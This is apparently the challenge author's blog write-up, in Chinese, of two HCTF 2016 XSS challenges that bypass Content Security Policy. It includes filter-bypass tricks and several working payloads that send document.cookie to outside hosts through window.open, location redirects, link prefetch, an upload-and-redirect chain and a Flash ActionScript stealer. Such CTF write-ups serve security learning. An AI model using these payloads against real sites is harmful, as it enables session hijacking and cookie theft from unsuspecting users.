---
title: hctf2016 guestbook&secret area writeup
date: 2016-11-30 21:59:37
tags:
- Blogs
- ctf
- hctf
- csp
categories:
- Blogs
---

这次比赛专门出了两个xss题目，前段时间阅读了几篇和CSP有关的文章，有了一些特别的理解，所以就专门出了2题

第一题guestbook思路来自于
[http://paper.seebug.org/91/](http://paper.seebug.org/91/)

当然我自己也写了分析文章
[http://lorexxar.cn/2016/10/28/csp-then/](http://lorexxar.cn/2016/10/28/csp-then/)

源码
[https://github.com/LoRexxar/hctf2016_guestbook](https://github.com/LoRexxar/hctf2016_guestbook)

出题思路主要来自于CSP对域的限制，但是没想到翻车了，忘记了location的问题，导致guestbook的做法简单了一倍多，在中途的时候突然发现了几个特殊的payload，发现题目思路和去年的Boston Key Party2015中一题思路接近，不得不说，最早接触CSP就是因为BKP，但当时因为水平浅薄所以没能理解，下面附上我自己的writeup

题目:guestbook
最终分数：226
完成队伍：35

第二题secret area

出题思路主要来自于
[https://chloe.re/2016/07/25/bypassing-paths-with-open-redirects-in-csp/](https://chloe.re/2016/07/25/bypassing-paths-with-open-redirects-in-csp/)

当然我自己也写了分析文章
[http://lorexxar.cn/2016/10/31/csp-then2/](http://lorexxar.cn/2016/10/31/csp-then2/)

源码
[https://github.com/LoRexxar/hctf2016_secret_area](https://github.com/LoRexxar/hctf2016_secret_area)

题目主要思路是通过重定向绕过CSP的目录限制，但是站功能一多了难免就遇到了各种问题，已知有4种解法，后面会说的详细一些

题目：secret area
最终分数：340
完成队伍：16

<!--more-->

# guestbook #

上来就是一个留言板，看起来就是xss题目，至于下面的md5碰撞，只是为了减少无意义的请求，差不多是验证码的性质，有些人可能没接触过，那么附上一个碰撞脚本

```
def crack_code(code):
	str = 10000

	while 1:
		m2 = hashlib.md5()   
		m2.update(repr(str))
		if (m2.hexdigest()[0:4]==code):
			return str
			break
		str+=1

print crack_code('84a3')
```

差不多4位的md5只要几秒就跑到了，回到题目正题，从代码中我们可以看到基本的过滤

```
function filter($string)
{
	$escape = array('\'','\\\\');
	$escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);
	$safe = array('select', 'insert', 'update', 'delete', 'where');
 	$safe = '/' . implode('|', $safe) . '/i';
 	$string = preg_replace($safe, 'hacker', $string);
	$xsssafe = array('img','script','on','svg','link');
	$xsssafe = '/' . implode('|', $xsssafe) . '/i';
	return preg_replace($xsssafe, '', $string);
}
```

我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于
`scrscriptipt`这样。

所以其实关键在于CSP

```
Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'
```

不熟悉的人可能并不清楚其中的CSP有什么样的问题，试试上，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。

## 跳转绕过 ##

```
<scrscriptipt>window.open("​http://xxxx:8080/cookie.asp?msg="+document.body​)</scrscr iptipt>

<scrscriptipt>window.locatioonn.href%3d"http%3a//www.example.com/xss/write.php%3fdomain%3d"%2bescape(document.cookie)%3b</sscriptcript>

<scrscriptipt>var a=document.createElement("a");a.href='http://xss.com/?cookie='+escape(document.cookie);a.click();</sscriptcript>
```

上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。

## chrome对CSP支持的不完整绕过 ##

这种也就是我出题的本意，从文章中可以获得对漏洞的整体了解，主要是2篇

[http://paper.seebug.org/91/](http://paper.seebug.org/91/)

当然我自己也写了分析文章
[http://lorexxar.cn/2016/10/28/csp-then/](http://lorexxar.cn/2016/10/28/csp-then/)

这里我的后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload

```
<Scscriptript>var n0t = document.createElement("liscriptnk");n0t.setAttribute("rel", "prefetch");n0t.setAttribute("href", "//xxx:2333/" + document.cookie);document.head.appendChild(n0t);</Scscriptript>
```

后面xss平台或者vps接受一发搞定

# secret area #

打开页面发现了聊天版性质的站，进出找一找发现有这么几个功能：

注册->登陆->可以修改个人信息河头乡->向任何人留言

稍微测试，不难发现
```
Content-Security-Policy:default-src 'self'; script-src http://sguestbook.hctf.io/static/ 'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'
```

CSP限制的域差不多符合以下几个条件:
1、script没有开启unsafe-inline，也就是说不允许内联脚本
2、script只允许static目录，但这个目录下内容不可控
3、style-src开启了unsafe-inline而且是self（这里其实是不小心的失误）
4、default-src为self，也就是站内请求都是被许可的

## 正解 ##

综合CSP的限制，我们需要回去想想题目中给的条件，有几个比较重要的。
1、static下不存在任何非静态文件，除了redirect.php
2、redirect.php的跳转位置可以自定义
3、我们上传的头像没有任何上传漏洞，上传位置是/upload/

这里先给出一篇文章
[http://lorexxar.cn/2016/10/31/csp-then2/](http://lorexxar.cn/2016/10/31/csp-then2/)

根据文章，我们不难发现，现在所有的条件都符合，如果顺着思路到这里，很容易就会想到下一步

构造上传图像为
```
<script>var xml = new XMLHttpRequest(); xml.open('POST', 'http://sguestbook.hctf.io/submit.php', true); xml.setRequestHeader("Content-type","application/x-www-form-urlencoded"); xml.send('to=xxxx&message='+document.cookie); </script> 
```

然后向admin发送
```
<scscriptript src="http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d"></scriscriptpt>
```

## 前面步骤相同，最后的域限制通过跳转来绕过 ##

这个其实没什么好说的，其他的部分相同，只有最后一步使用location来获得cookie，payload和上题相同，就不贴了。


## 精心构造flash xss ##

这种方式是Blue-Whale的师傅想到的，根据上面CSP限制，我们很快就能发现其实对于除script以外的部分都比较友好，只要在域内就可以了，再加上，域内存在上传点，那么我们是不是可以构造一个**Action Script**

payload，头像处上传

```
import flash.external.ExternalInterface;
var ck; ck = ExternalInterface.call('function(){return document.cookie}'); ua = ExternalInterface.call('function(){return navigator.userAgent}'); ExternalInterface.call("$.post","submit.php",'to=qqc&message=document.cookie'+ck+ua); stop();
```

然后构造
```
<embed src="http://sguestbook.hctf.io/upload/4b3097d0fef014bc099fe305fd2cb685" type="applicatioONn/x-shockwave-flash"></embed>

```

这个payload只要浏览器有flash就可以了

## 强制刷新多次跳转 ##

这里有一种在比赛中遇到的特别的payload，使用的漏洞和前面提到的相同，也是多次跳转导致的目录绕过，但是特别的是，使用了一种特别的手段

payload我没找到，但是类似于

```
<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cDovLzE2My40NC4xNTUuMTc5Ijs8L3NjcmlwdD4=">
```

上面应该是个错误的payload，但是在守护的过程中的确存在有效payload，只可惜没能记录下来。

我最早看到这个payload，在
[http://www.tuicool.com/m/articles/77bABnm](http://www.tuicool.com/m/articles/77bABnm)

